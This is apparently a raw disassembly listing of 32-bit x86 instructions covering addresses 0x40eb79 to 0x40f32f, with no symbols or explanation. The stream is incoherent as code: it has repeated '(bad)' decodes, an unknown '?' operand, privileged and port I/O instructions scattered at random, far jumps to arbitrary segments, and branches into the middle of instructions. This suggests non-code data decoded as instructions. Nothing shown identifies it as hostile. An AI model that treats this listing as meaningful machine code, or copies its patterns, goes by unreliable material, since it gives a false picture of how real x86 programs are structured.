  40eb79:	pop    ss
  40eb7a:	adc    eax,0x1cec05b0
  40eb7f:	xor    DWORD PTR [ecx+0x6fd7744],edi
  40eb85:	and    bl,BYTE PTR [ebx+0x668c17be]
  40eb8b:	and    DWORD PTR [eax*1+0x4d972594],ebp
  40eb92:	mov    ah,0x1b
  40eb94:	pushf  
  40eb95:	xor    bh,dl
  40eb97:	dec    ebx
  40eb98:	iret   
  40eb99:	jb     0x40eb43
  40eb9b:	imul   ecx,edi,0x3fc236ca
  40eba1:	jge    0x40eb7b
  40eba3:	cmp    ebx,esp
  40eba5:	faddp  st(7),st
  40eba7:	cmp    DWORD PTR [eax-0x3d7adbea],eax
  40ebad:	mov    es,WORD PTR [ebp-0x382f4a97]
  40ebb3:	aas    
  40ebb4:	jmp    0x17f69898
  40ebb9:	jb     0x40ebed
  40ebbb:	mov    ah,0x64
  40ebbd:	push   cs
  40ebbe:	push   0xa92429b8
  40ebc3:	stc    
  40ebc4:	aad    0x32
  40ebc6:	bound  edx,QWORD PTR [eax-0x534861df]
  40ebcc:	lock jno 0x40eb8c
  40ebcf:	and    eax,0xf9c16cba
  40ebd4:	popf   
  40ebd5:	xchg   esi,eax
  40ebd6:	lods   eax,DWORD PTR ds:[esi]
  40ebd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebd8:	repz mov ebx,DWORD PTR [esi-0x67bd8e3e]
  40ebdf:	adc    DWORD PTR [esi],ecx
  40ebe1:	hlt    
  40ebe2:	mov    BYTE PTR [esp+eax*4+0x6a03cf8c],ah
  40ebe9:	adc    ecx,DWORD PTR [ebx+0x20]
  40ebec:	xor    DWORD PTR [ebx-0x1],0xffffffd8
  40ebf0:	(bad)  [eax+0x6f]
  40ebf3:	js     0x40ebc2
  40ebf5:	and    BYTE PTR [ecx],0x83
  40ebf8:	gs mov ah,0x35
  40ebfb:	arpl   WORD PTR [ecx],ax
  40ebfd:	and    DWORD PTR [ecx+0x20],edi
  40ec00:	(bad)  [esi+0x16]
  40ec03:	adc    eax,0x54e30add
  40ec08:	mov    ds:0x9f9b19af,al
  40ec0d:	jecxz  0x40ec64
  40ec0f:	mov    esi,0x35722907
  40ec14:	retf   
  40ec15:	adc    BYTE PTR [eax+0x6496df22],ch
  40ec1b:	push   ebx
  40ec1c:	imul   esi,DWORD PTR ss:[edi],0xb2c09ec
  40ec23:	ins    BYTE PTR es:[edi],dx
  40ec24:	adc    BYTE PTR [esi-0x17],cl
  40ec27:	push   0x746a5507
  40ec2c:	setae  cl
  40ec2f:	cmp    DWORD PTR [ecx],edi
  40ec31:	out    dx,al
  40ec32:	imul   edi,DWORD PTR [eax]
  40ec35:	sti    
  40ec36:	add    al,0x48
  40ec38:	push   edi
  40ec39:	inc    ebx
  40ec3a:	pop    ss
  40ec3b:	int    0x6a
  40ec3d:	stc    
  40ec3e:	sub    edi,DWORD PTR [ebx+0x1d]
  40ec41:	nop
  40ec42:	aam    0xcb
  40ec44:	sub    dl,BYTE PTR [edi+0x192fa094]
  40ec4a:	and    al,0xac
  40ec4c:	jp     0x40ebea
  40ec4e:	outs   dx,DWORD PTR ds:[esi]
  40ec4f:	mov    bh,0x8e
  40ec51:	cmp    DWORD PTR [ebx+0x25461b3c],ebp
  40ec57:	in     eax,0x2
  40ec59:	and    eax,0x7afa8f34
  40ec5e:	sbb    al,0xf0
  40ec60:	imul   esi,ebx,0xdf2376a5
  40ec66:	pop    es
  40ec67:	or     ecx,esi
  40ec69:	out    0xe,al
  40ec6b:	pop    ebp
  40ec6c:	push   ds
  40ec6d:	faddp  st(3),st
  40ec6f:	push   0x66
  40ec71:	fstp   QWORD PTR [ebp+0x45]
  40ec74:	jge    0x40ec48
  40ec76:	aaa    
  40ec77:	and    al,0x65
  40ec79:	mov    WORD PTR [ebx-0x71],ss
  40ec7c:	hlt    
  40ec7d:	fidivr DWORD PTR [edx]
  40ec7f:	enter  0xa139,0xb0
  40ec83:	in     eax,dx
  40ec84:	aad    0x43
  40ec86:	mov    bl,0x38
  40ec88:	dec    edx
  40ec89:	sub    eax,0xef14bb2e
  40ec8e:	push   edi
  40ec8f:	push   esi
  40ec90:	fcomp  DWORD PTR [edi-0x5095fddb]
  40ec96:	mov    esp,0x9638a847
  40ec9b:	pop    esi
  40ec9c:	hlt    
  40ec9d:	pop    es
  40ec9e:	mov    ?,WORD PTR [ecx+0x41d9ed5e]
  40eca4:	xchg   DWORD PTR [esi],edi
  40eca6:	sub    BYTE PTR [ecx+0x7e],ah
  40eca9:	cmp    al,0xe1
  40ecab:	lods   al,BYTE PTR ds:[esi]
  40ecac:	or     esi,eax
  40ecae:	pop    ds
  40ecaf:	sub    BYTE PTR [ecx+0x2f0c00c2],dl
  40ecb5:	pusha  
  40ecb6:	jmp    0x2302:0xad33e030
  40ecbd:	call   0x1225639b
  40ecc2:	mov    ds:0xf14ff298,al
  40ecc7:	rol    DWORD PTR [ebx-0x2a015376],cl
  40eccd:	adc    eax,0xd04086a9
  40ecd2:	pop    edi
  40ecd3:	xor    cl,cl
  40ecd5:	jmp    0x54ad0272
  40ecda:	lds    eax,FWORD PTR ds:0xb39bf22b
  40ece0:	dec    ebp
  40ece1:	mov    ebp,0xf10159a0
  40ece6:	pop    esi
  40ece7:	(bad)  
  40ece9:	and    ax,bp
  40ecec:	out    dx,eax
  40eced:	in     eax,dx
  40ecee:	dec    esi
  40ecef:	das    
  40ecf0:	mov    cl,0xd2
  40ecf2:	mov    ch,al
  40ecf4:	cmp    eax,0xd7e1c690
  40ecf9:	enter  0x66b0,0xd6
  40ecfd:	mov    ds:0xd9425430,eax
  40ed02:	push   es
  40ed03:	and    eax,0xb55cd150
  40ed08:	sub    BYTE PTR [eax-0x44c4b978],cl
  40ed0e:	call   0x3c6c1b06
  40ed13:	jae    0x40ecab
  40ed15:	stc    
  40ed16:	pop    ss
  40ed17:	add    BYTE PTR [edi+0x9],al
  40ed1a:	dec    edx
  40ed1b:	push   edx
  40ed1c:	enter  0x255f,0x65
  40ed20:	je     0x40ed82
  40ed22:	test   eax,0xabdab479
  40ed27:	aas    
  40ed28:	js     0x40ecaf
  40ed2a:	inc    edx
  40ed2b:	pushf  
  40ed2c:	not    BYTE PTR [eax]
  40ed2e:	(bad)  
  40ed31:	push   cs
  40ed32:	ret    
  40ed33:	inc    esp
  40ed34:	mov    BYTE PTR [ebp+eiz*8+0xe],cl
  40ed38:	pop    esi
  40ed39:	dec    esp
  40ed3a:	test   BYTE PTR [esi],0xd8
  40ed3d:	jmp    0x819692cc
  40ed42:	lds    eax,FWORD PTR [ecx+0x5a]
  40ed45:	pusha  
  40ed46:	mov    bl,0xd6
  40ed48:	repz sbb al,0x38
  40ed4b:	shr    BYTE PTR [edx-0x29],0x3
  40ed4f:	sbb    esp,esp
  40ed51:	jle    0x40ed05
  40ed53:	and    bh,BYTE PTR [ebp+0x395993]
  40ed59:	mov    esi,0xb13b91af
  40ed5e:	cmp    eax,0x6517ffac
  40ed63:	cmc    
  40ed64:	push   ds
  40ed65:	call   0x24bc9fc2
  40ed6a:	inc    edx
  40ed6b:	call   FWORD PTR [esp+ebp*2-0x74a85932]
  40ed72:	std    
  40ed73:	push   ds
  40ed74:	adc    edi,DWORD PTR [esp+edi*4-0x7d7f403]
  40ed7b:	push   ebx
  40ed7c:	ins    DWORD PTR es:[edi],dx
  40ed7d:	jb     0x40ed2e
  40ed7f:	in     al,dx
  40ed80:	nop    eax
  40ed83:	sbb    DWORD PTR [eax],ebx
  40ed85:	cmp    ch,BYTE PTR [ecx-0x74ae1c6f]
  40ed8b:	ins    DWORD PTR es:[edi],dx
  40ed8c:	jae    0x40ed59
  40ed8e:	jg     0x40edfc
  40ed90:	xlat   BYTE PTR ds:[ebx]
  40ed91:	cmp    ebx,DWORD PTR ds:0xc6b6039a
  40ed97:	cmp    dl,dl
  40ed99:	xchg   BYTE PTR [edx-0x47d8ee8b],bl
  40ed9f:	les    edi,FWORD PTR [edx-0x7db1ab62]
  40eda5:	push   cs
  40eda6:	xchg   ebx,eax
  40eda7:	stc    
  40eda8:	inc    ebx
  40eda9:	jp     0x40edf8
  40edab:	xchg   ch,ah
  40edad:	xor    BYTE PTR [esi+0x1a],0x36
  40edb1:	ins    BYTE PTR es:[edi],dx
  40edb2:	xchg   BYTE PTR [esi],dh
  40edb4:	gs jne 0x40ed90
  40edb7:	sub    DWORD PTR [ebp-0x64],esp
  40edba:	sbb    al,BYTE PTR [ecx+0x219a4172]
  40edc0:	adc    al,0xf9
  40edc2:	call   0x6df:0xe117ac19
  40edc9:	push   ss
  40edca:	pop    ds
  40edcb:	push   0x5db1e081
  40edd0:	lods   eax,DWORD PTR ds:[esi]
  40edd1:	ins    DWORD PTR es:[edi],dx
  40edd2:	mov    ds:0x47514771,al
  40edd7:	test   eax,0x5e43e54d
  40eddc:	shr    BYTE PTR [edi-0x204c5b28],0x40
  40ede3:	xchg   ebp,eax
  40ede4:	cli    
  40ede5:	jnp    0x40ee0d
  40ede7:	lea    esp,[edi-0x3952c870]
  40eded:	test   BYTE PTR ds:0x99c9ebb,al
  40edf3:	cmp    BYTE PTR ds:0xf16655f1,cl
  40edf9:	or     al,0xd3
  40edfb:	xchg   DWORD PTR [edi+esi*2-0x5d],ebp
  40edff:	pop    ebx
  40ee00:	xchg   DWORD PTR [edx+0x1158b473],ebp
  40ee06:	ja     0x40ed8e
  40ee08:	repnz mov eax,0x67c00703
  40ee0e:	fcomi  st,st(5)
  40ee10:	adc    eax,0x39d37dca
  40ee15:	das    
  40ee16:	retf   0xb34f
  40ee19:	adc    DWORD PTR [edi-0x36],ebp
  40ee1c:	dec    eax
  40ee1d:	adc    esi,DWORD PTR [edi-0x98b88ec]
  40ee23:	dec    edx
  40ee24:	sti    
  40ee25:	clc    
  40ee26:	dec    esi
  40ee27:	leave  
  40ee28:	mov    ebp,0x1aecc766
  40ee2d:	lods   eax,DWORD PTR ds:[esi]
  40ee2e:	stc    
  40ee2f:	inc    edx
  40ee30:	fwait
  40ee31:	popa   
  40ee32:	ins    DWORD PTR es:[edi],dx
  40ee33:	xor    BYTE PTR [edx-0x76],dh
  40ee36:	pusha  
  40ee37:	js     0x40ee95
  40ee39:	mov    dl,0x5d
  40ee3b:	inc    esi
  40ee3c:	pop    es
  40ee3d:	pop    ebp
  40ee3e:	mov    bh,0x24
  40ee40:	ficom  WORD PTR [ecx-0x7a]
  40ee43:	sub    bh,ah
  40ee45:	jge    0x40ee31
  40ee47:	or     DWORD PTR [eax-0x64],esp
  40ee4a:	sub    DWORD PTR [esi],ebp
  40ee4c:	addr16 add ch,cl
  40ee4f:	leave  
  40ee50:	ins    DWORD PTR es:[edi],dx
  40ee51:	xor    al,0x97
  40ee53:	cmp    dh,bl
  40ee55:	out    dx,al
  40ee56:	jmp    0x65f9:0x361fb2f2
  40ee5d:	or     al,0x60
  40ee5f:	push   cs
  40ee60:	in     eax,dx
  40ee61:	xchg   BYTE PTR [esi],ch
  40ee63:	in     al,dx
  40ee64:	(bad)  
  40ee65:	xchg   edx,eax
  40ee66:	or     al,0xb
  40ee68:	jmp    0x40ee81
  40ee6a:	shl    BYTE PTR [ecx+esi*1],1
  40ee6d:	test   DWORD PTR es:[edx-0x57e896f7],eax
  40ee74:	jae    0x40ee94
  40ee76:	cwde   
  40ee77:	pop    eax
  40ee78:	and    BYTE PTR [ecx+ebp*2-0x15],dh
  40ee7c:	dec    eax
  40ee7d:	sbb    dl,BYTE PTR [ebx+0x79043d28]
  40ee83:	sub    eax,0x5b0e6619
  40ee88:	das    
  40ee89:	inc    ecx
  40ee8a:	mov    bh,0xc2
  40ee8c:	dec    esi
  40ee8d:	fs in  al,dx
  40ee8f:	pop    ebp
  40ee90:	sub    dl,BYTE PTR [ebp+esi*4-0x73decae5]
  40ee97:	addr16 gs sub eax,0x59c7b7ea
  40ee9e:	jmp    DWORD PTR [edx+ebx*8+0x47cbdd0c]
  40eea5:	mov    es,WORD PTR [edx-0x57d2cad0]
  40eeab:	mov    ds:0xfd799812,eax
  40eeb0:	rcl    BYTE PTR [esi],cl
  40eeb2:	xchg   edx,eax
  40eeb3:	pop    ecx
  40eeb4:	lods   eax,DWORD PTR ds:[esi]
  40eeb5:	inc    edi
  40eeb6:	pop    es
  40eeb7:	cmp    DWORD PTR [eax+eiz*4-0x411a9d7c],edx
  40eebe:	aas    
  40eebf:	and    cl,BYTE PTR [edi+0x6886a08e]
  40eec5:	icebp  
  40eec6:	sub    esi,DWORD PTR [esi-0x61bc67fa]
  40eecc:	push   ebx
  40eecd:	jp     0x40ef4d
  40eecf:	mov    esi,0xf8059484
  40eed4:	xor    dl,dl
  40eed6:	lahf   
  40eed7:	push   ecx
  40eed8:	ret    
  40eed9:	call   0x4a7f0077
  40eede:	ds adc al,0x77
  40eee1:	sbb    bh,dh
  40eee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eee4:	adc    esp,DWORD PTR [edi+eiz*2]
  40eee7:	retf   0xf2fc
  40eeea:	adc    BYTE PTR [edi],0x93
  40eeed:	mov    ah,0xe9
  40eeef:	(bad)  [ebx+eax*2+0x34a02a31]
  40eef6:	xor    ah,BYTE PTR [eax+0x3891abdc]
  40eefc:	sub    BYTE PTR [edx-0x79],bh
  40eeff:	(bad)  
  40ef00:	mov    esi,0x4224b76a
  40ef05:	data16 aad 0x8f
  40ef08:	or     al,0x6b
  40ef0a:	fidivr WORD PTR [esi+eiz*1-0x64d53b74]
  40ef11:	mov    bh,0xc8
  40ef13:	mov    al,ds:0xbb1e0506
  40ef18:	add    DWORD PTR [eax-0x22774821],eax
  40ef1e:	sahf   
  40ef1f:	jbe    0x40ef2e
  40ef21:	and    al,0xfb
  40ef23:	lahf   
  40ef24:	outs   dx,DWORD PTR ds:[esi]
  40ef25:	inc    ecx
  40ef26:	lds    edx,FWORD PTR [eax+0x1acae803]
  40ef2c:	cmp    eax,0x30883c0d
  40ef31:	ins    BYTE PTR es:[edi],dx
  40ef32:	ja     0x40ef2c
  40ef34:	mov    ebp,0xdb859818
  40ef39:	push   0xfffffff6
  40ef3b:	fisubr DWORD PTR [esi+0x23]
  40ef3e:	enter  0xf21a,0xe
  40ef42:	jne    0x40ef69
  40ef44:	mov    bh,0x64
  40ef46:	push   esi
  40ef47:	mov    edx,0xba96c352
  40ef4c:	pop    ecx
  40ef4d:	mov    dh,0x8e
  40ef4f:	outs   dx,BYTE PTR ds:[esi]
  40ef50:	and    al,0xa1
  40ef52:	and    cl,dl
  40ef54:	mov    edx,0x80bb949d
  40ef59:	retf   0xe2a3
  40ef5c:	(bad)  
  40ef5d:	push   ebx
  40ef5e:	sahf   
  40ef5f:	sbb    BYTE PTR [edx-0x4a8b5bf2],ch
  40ef65:	sub    BYTE PTR fs:[eax-0x591abf55],dh
  40ef6c:	push   0x386a99f0
  40ef71:	cmp    eax,0xdd61ddf0
  40ef76:	pop    ebx
  40ef77:	jne    0x40efca
  40ef79:	shl    DWORD PTR ds:0x750d5378,1
  40ef7f:	mov    ds:0x7f515ec,eax
  40ef84:	adc    BYTE PTR [ecx-0xd258ff4],cl
  40ef8a:	xor    al,dl
  40ef8c:	jbe    0x40efac
  40ef8e:	or     al,0xed
  40ef90:	ss xchg edx,eax
  40ef92:	push   esi
  40ef93:	(bad)  
  40ef94:	(bad)  
  40ef95:	cli    
  40ef96:	out    dx,al
  40ef97:	test   DWORD PTR fs:[edi+0x59],eax
  40ef9b:	push   DWORD PTR ds:0x50447780
  40efa1:	or     ebx,0x3f
  40efa4:	mov    al,0x6d
  40efa6:	jmp    0x40efda
  40efa8:	scas   al,BYTE PTR es:[edi]
  40efa9:	(bad)  
  40efaa:	xor    al,0x53
  40efac:	jne    0x40ef99
  40efae:	dec    esp
  40efaf:	call   0xe5b:0x41ce8960
  40efb6:	xor    DWORD PTR [esp+eax*1+0x4f],edx
  40efba:	int    0x56
  40efbc:	xor    edi,0xffffffd5
  40efbf:	add    ah,BYTE PTR [eax-0xa]
  40efc2:	jg     0x40f00e
  40efc4:	adc    al,0xc
  40efc6:	mov    ebx,0x30955e3d
  40efcb:	das    
  40efcc:	xor    BYTE PTR [eax],ch
  40efce:	loop   0x40ef83
  40efd0:	push   0xb89ee04c
  40efd5:	jle    0x40f03e
  40efd7:	shl    BYTE PTR [ebp+0x13],0xd0
  40efdb:	and    al,0xff
  40efdd:	daa    
  40efde:	sub    BYTE PTR [ebx+eax*8+0xf0dd9f8],0x2f
  40efe6:	adc    ebx,ebp
  40efe8:	ret    0xa704
  40efeb:	mov    ds,WORD PTR [edi+0x6b]
  40efee:	cwde   
  40efef:	add    DWORD PTR [edi+0x6385c5d4],esi
  40eff5:	sub    bh,BYTE PTR [eax-0x566f5388]
  40effb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40effc:	pop    es
  40effd:	loopne 0x40f019
  40efff:	shl    BYTE PTR [esi+0x41],0x6
  40f003:	pop    ecx
  40f004:	ffree  st(3)
  40f006:	test   eax,0xfe4a31c4
  40f00b:	imul   esp,DWORD PTR [ebp+0x64],0xbc6dcab6
  40f012:	add    BYTE PTR [esi],0x3c
  40f015:	sti    
  40f016:	push   0xa839f436
  40f01b:	outs   dx,BYTE PTR ds:[esi]
  40f01c:	mov    ebp,0xa71c4cf2
  40f022:	inc    esp
  40f023:	in     al,0x94
  40f025:	cdq    
  40f026:	scas   eax,DWORD PTR es:[edi]
  40f027:	add    ch,al
  40f029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f02a:	or     eax,0xbdf003f
  40f02f:	mov    WORD PTR [ebx+0x692168bf],ds
  40f035:	jge    0x40f04c
  40f037:	push   esp
  40f038:	xor    dl,bl
  40f03a:	push   cs
  40f03b:	xchg   ebp,eax
  40f03c:	in     al,dx
  40f03d:	outs   dx,BYTE PTR ds:[esi]
  40f03e:	cmp    BYTE PTR [esi-0x38],dh
  40f041:	pop    ebp
  40f042:	imul   esi,DWORD PTR [ebx],0x36
  40f045:	test   al,0xdb
  40f048:	inc    esp
  40f049:	adc    esp,esi
  40f04b:	popa   
  40f04c:	dec    edi
  40f04d:	lock xor al,0x3c
  40f050:	xchg   ecx,eax
  40f051:	cmp    al,0x49
  40f053:	repz mov esp,0x641202c
  40f059:	rcl    BYTE PTR [edx+esi*1+0x47119ef3],1
  40f060:	and    al,0x95
  40f062:	into   
  40f063:	stc    
  40f064:	or     DWORD PTR [ebx+0x23],edi
  40f067:	or     dl,BYTE PTR [ecx+0x21]
  40f06a:	push   0x4f
  40f06c:	inc    eax
  40f06d:	jg     0x40f00e
  40f06f:	ja     0x40f011
  40f071:	in     al,dx
  40f072:	sub    DWORD PTR [ebx+0x7498e7f6],eax
  40f078:	imul   esi,edi,0x10d6394e
  40f07e:	add    DWORD PTR [ecx],ebp
  40f080:	dec    ebx
  40f081:	mov    esi,0x1052ca62
  40f086:	loop   0x40f0ee
  40f088:	aas    
  40f089:	ds xchg esi,ecx
  40f08c:	xor    eax,DWORD PTR [edx+eiz*8+0x10]
  40f090:	rcr    esp,1
  40f092:	data16 mov ds:0xe36043d7,al
  40f098:	jae    0x40f03e
  40f09a:	inc    esi
  40f09b:	push   esi
  40f09c:	lods   eax,DWORD PTR ds:[esi]
  40f09d:	and    BYTE PTR [ebx],0xdd
  40f0a0:	test   al,0x46
  40f0a2:	adc    BYTE PTR [edx-0x28349739],dl
  40f0a8:	lea    edi,[ecx]
  40f0aa:	add    al,0x98
  40f0ac:	push   es
  40f0ad:	loope  0x40f0d8
  40f0af:	ins    DWORD PTR es:[edi],dx
  40f0b0:	sub    ecx,0xbe29b04
  40f0b6:	daa    
  40f0b7:	xor    eax,0x96166970
  40f0bc:	rol    BYTE PTR [esi],1
  40f0be:	jb     0x40f059
  40f0c0:	popa   
  40f0c1:	ror    esp,cl
  40f0c3:	test   BYTE PTR [esi-0xf],ch
  40f0c6:	fsubr  st(2),st
  40f0c8:	(bad)  
  40f0ca:	inc    ebx
  40f0cb:	cli    
  40f0cc:	rol    bh,1
  40f0ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0cf:	dec    ebp
  40f0d0:	aad    0x92
  40f0d2:	fwait
  40f0d3:	ds aas 
  40f0d5:	in     al,dx
  40f0d6:	int3   
  40f0d7:	repz mov al,ds:0xb3daceec
  40f0dd:	push   ebx
  40f0de:	sbb    DWORD PTR [eax],0x44
  40f0e1:	imul   esi,DWORD PTR [edi-0x4f95646d],0xffffffc3
  40f0e8:	sbb    edx,DWORD PTR [eax]
  40f0ea:	dec    eax
  40f0eb:	sbb    dh,BYTE PTR [ebx+0x6f9f0be0]
  40f0f1:	test   al,0x8c
  40f0f3:	xchg   edx,edi
  40f0f5:	int    0xe3
  40f0f7:	mov    BYTE PTR [edx-0x72],0x59
  40f0fb:	mov    DWORD PTR [ebx-0x46],esi
  40f0fe:	sub    al,0x17
  40f100:	dec    eax
  40f101:	adc    eax,0xef56e697
  40f106:	sahf   
  40f107:	jp     0x40f14a
  40f109:	mov    ebp,0x51cb2217
  40f10e:	mov    DWORD PTR [edx],ebp
  40f110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f112:	adc    al,0x2a
  40f114:	or     bh,BYTE PTR [edi]
  40f116:	pushf  
  40f117:	imul   esi,DWORD PTR [ecx+edi*1+0x64db1258],0xb9657bbc
  40f122:	xchg   esi,eax
  40f123:	hlt    
  40f124:	jb     0x40f19b
  40f126:	cdq    
  40f127:	imul   edi,esi,0x3a
  40f12a:	scas   al,BYTE PTR es:[edi]
  40f12b:	test   BYTE PTR [eax-0x1421817d],0x22
  40f132:	aaa    
  40f133:	sbb    al,0xfb
  40f135:	cmp    DWORD PTR [esi+ebp*2-0x49],eax
  40f139:	aaa    
  40f13a:	push   edx
  40f13b:	sbb    esi,DWORD PTR [edx-0x14]
  40f13e:	jge    0x40f17c
  40f140:	daa    
  40f141:	shl    DWORD PTR [ebx-0x72aef329],1
  40f147:	std    
  40f148:	scas   eax,DWORD PTR es:[edi]
  40f149:	mov    bh,0xbd
  40f14b:	push   esi
  40f14c:	inc    esi
  40f14d:	jne    0x40f107
  40f14f:	dec    ebp
  40f150:	lods   al,BYTE PTR ds:[esi]
  40f151:	mov    cs,WORD PTR es:[edx]
  40f154:	xor    eax,0x598d03c0
  40f159:	pop    ss
  40f15a:	jl     0x40f186
  40f15c:	mov    esi,0x8f499ee2
  40f161:	(bad)  
  40f162:	dec    edx
  40f163:	ss push edx
  40f165:	xchg   DWORD PTR [edx],edi
  40f167:	push   esp
  40f168:	call   0x7d88:0x135df337
  40f16f:	sbb    DWORD PTR [edi+esi*4+0x3f],esi
  40f173:	mov    ebp,cs
  40f175:	pop    ss
  40f176:	retf   
  40f177:	cmp    eax,0x35c0f94b
  40f17c:	pop    ebx
  40f17d:	mov    bl,0x65
  40f17f:	(bad)  
  40f180:	mov    ds:0xd382ccb8,al
  40f185:	mov    esp,0xfa505c45
  40f18a:	out    dx,eax
  40f18b:	jl     0x40f19a
  40f18d:	retf   0xd797
  40f190:	fidivr DWORD PTR [edx]
  40f192:	jmp    0x40f15c
  40f194:	mov    cl,0xb0
  40f196:	mov    cs,WORD PTR [ecx]
  40f198:	or     eax,0x4207ffc2
  40f19d:	sub    eax,0x561f4260
  40f1a2:	out    0xd3,al
  40f1a4:	std    
  40f1a5:	jnp    0x40f1f1
  40f1a7:	dec    edi
  40f1a8:	out    0x4f,al
  40f1aa:	sbb    eax,0x76174a6f
  40f1af:	pop    ds
  40f1b0:	out    0x34,eax
  40f1b2:	retf   0xb6f1
  40f1b5:	popa   
  40f1b6:	fistp  DWORD PTR [ecx]
  40f1b8:	pusha  
  40f1b9:	outs   dx,BYTE PTR ds:[esi]
  40f1ba:	xor    bl,bh
  40f1bc:	and    eax,0x9dbaf50f
  40f1c1:	mov    al,ds:0x2e4c80f6
  40f1c6:	sbb    al,0x3e
  40f1c8:	in     al,dx
  40f1c9:	sub    eax,DWORD PTR [ebx+0x32d8de7d]
  40f1cf:	or     DWORD PTR [eax+ebx*8],0xfffffff4
  40f1d3:	not    ch
  40f1d5:	sbb    BYTE PTR [ebp+ebx*2-0x32],ah
  40f1d9:	pop    es
  40f1da:	sar    BYTE PTR [edi],0x6b
  40f1dd:	lahf   
  40f1de:	cmp    BYTE PTR [edx+0x6c],ah
  40f1e1:	push   es
  40f1e2:	jns    0x40f172
  40f1e4:	cs iret 
  40f1e6:	mov    eax,ds:0xfa8994e6
  40f1eb:	xchg   edx,eax
  40f1ec:	or     bh,BYTE PTR [edx-0x574d86b8]
  40f1f2:	pop    es
  40f1f3:	stc    
  40f1f4:	call   DWORD PTR [eax]
  40f1f6:	adc    esi,ecx
  40f1f8:	popa   
  40f1f9:	into   
  40f1fa:	hlt    
  40f1fb:	sub    al,0xc4
  40f1fd:	add    ebx,edx
  40f1ff:	vpsubw ymm6,ymm7,YMMWORD PTR [edx-0x1c]
  40f204:	sub    al,0x6c
  40f206:	stc    
  40f207:	or     al,0xe1
  40f209:	or     esp,DWORD PTR [ebx-0x34f50357]
  40f20f:	sbb    cl,BYTE PTR [eax+0x38e6b74b]
  40f215:	pop    ss
  40f216:	rol    DWORD PTR [ecx],0x64
  40f219:	aaa    
  40f21a:	(bad)  
  40f21b:	mov    cl,BYTE PTR [ebx-0x1c]
  40f21e:	ins    DWORD PTR es:[edi],dx
  40f21f:	fmul   st,st(2)
  40f221:	sti    
  40f222:	test   eax,0x28fe0901
  40f227:	(bad)  
  40f228:	fld    DWORD PTR [esi]
  40f22a:	sbb    DWORD PTR [edi+edi*4+0x45],edx
  40f22e:	or     al,0x50
  40f230:	clc    
  40f231:	jae    0x40f1f7
  40f233:	bound  esp,QWORD PTR [edi+0x5eac9f05]
  40f239:	inc    esi
  40f23a:	stc    
  40f23b:	sbb    bl,ch
  40f23d:	clc    
  40f23e:	and    ah,BYTE PTR [ebp-0x33]
  40f241:	arpl   dx,ax
  40f243:	in     eax,0x44
  40f245:	jbe    0x40f205
  40f247:	mov    esi,0xb51c4060
  40f24c:	mov    ch,0xa6
  40f24e:	repz xchg edi,eax
  40f250:	(bad)  
  40f251:	(bad)  
  40f252:	jecxz  0x40f231
  40f254:	mov    edx,0x2b50bb51
  40f259:	leave  
  40f25a:	retf   0x3d34
  40f25d:	mov    cl,0xfe
  40f25f:	mov    ecx,0xa7eabb6d
  40f264:	lea    edx,[ecx*2+0x7812464d]
  40f26b:	int    0xbc
  40f26d:	mov    DWORD PTR [eax+ebp*2-0x35],ebp
  40f271:	push   ebp
  40f272:	xor    bh,BYTE PTR [ecx-0x73]
  40f275:	mov    eax,0xc87d895c
  40f27a:	aaa    
  40f27b:	xchg   ecx,eax
  40f27c:	and    eax,0x294bcc7f
  40f281:	fbld   TBYTE PTR [eax-0x14]
  40f284:	in     al,0xf8
  40f286:	xor    al,BYTE PTR [eax]
  40f288:	arpl   WORD PTR [ecx-0x2de54276],bp
  40f28e:	push   esi
  40f28f:	mov    eax,0x5c2b7a97
  40f294:	mov    edi,0xb689be1e
  40f29a:	or     BYTE PTR [esi-0x1661fbb2],al
  40f2a0:	mov    cl,0x20
  40f2a2:	(bad)  
  40f2a3:	xchg   edx,eax
  40f2a4:	push   ecx
  40f2a5:	in     al,0x65
  40f2a7:	add    BYTE PTR [ebx],0x45
  40f2aa:	jae    0x40f27c
  40f2ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2ad:	sub    DWORD PTR [edi-0x72],ebp
  40f2b0:	stos   DWORD PTR es:[edi],eax
  40f2b1:	in     eax,dx
  40f2b2:	outs   dx,BYTE PTR cs:[esi]
  40f2b4:	and    BYTE PTR cs:[ecx+0x331ab2e8],0x93
  40f2bc:	imul   ebp,DWORD PTR [edx+ecx*4],0xaaf139ae
  40f2c3:	pop    eax
  40f2c4:	adc    ecx,DWORD PTR [esi-0x1c]
  40f2c7:	xchg   esp,eax
  40f2c8:	setge  BYTE PTR [eax]
  40f2cb:	inc    ecx
  40f2cc:	push   ds
  40f2cd:	sub    dh,BYTE PTR [ebx+ebx*2]
  40f2d0:	dec    eax
  40f2d1:	jbe    0x40f2cf
  40f2d3:	cmp    DWORD PTR [edi-0x24466971],edx
  40f2d9:	sbb    eax,0xa48eabf
  40f2de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2df:	sub    DWORD PTR [edx-0x2391a033],edi
  40f2e5:	(bad)  
  40f2e6:	enter  0xfb62,0x82
  40f2ea:	mov    al,BYTE PTR [eax]
  40f2ec:	jecxz  0x40f2fc
  40f2ee:	jo     0x40f327
  40f2f0:	popf   
  40f2f1:	fs je  0x40f32c
  40f2f4:	pushf  
  40f2f5:	addr16 or al,0xbd
  40f2f8:	sub    BYTE PTR [esp+eax*4],bl
  40f2fb:	inc    eax
  40f2fc:	xor    BYTE PTR [esi-0x4eb2bfb6],0xc4
  40f303:	(bad)  [eax-0xc]
  40f306:	pusha  
  40f307:	outs   dx,DWORD PTR ds:[esi]
  40f308:	push   esi
  40f309:	out    0x18,al
  40f30b:	aad    0x11
  40f30d:	jl     0x40f29c
  40f30f:	stc    
  40f310:	mov    eax,DWORD PTR [edx]
  40f312:	pushf  
  40f313:	jae    0x40f350
  40f315:	mov    ebx,0xa4a5322f
  40f31a:	ret    
  40f31b:	gs inc edi
  40f31d:	cld    
  40f31e:	or     ecx,esi
  40f320:	mov    edx,0x9b47fb06
  40f325:	fsub   QWORD PTR [ecx]
  40f327:	add    DWORD PTR [edi-0x4602a8c],esi
  40f32d:	pusha  
  40f32e:	iret   
  40f32f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
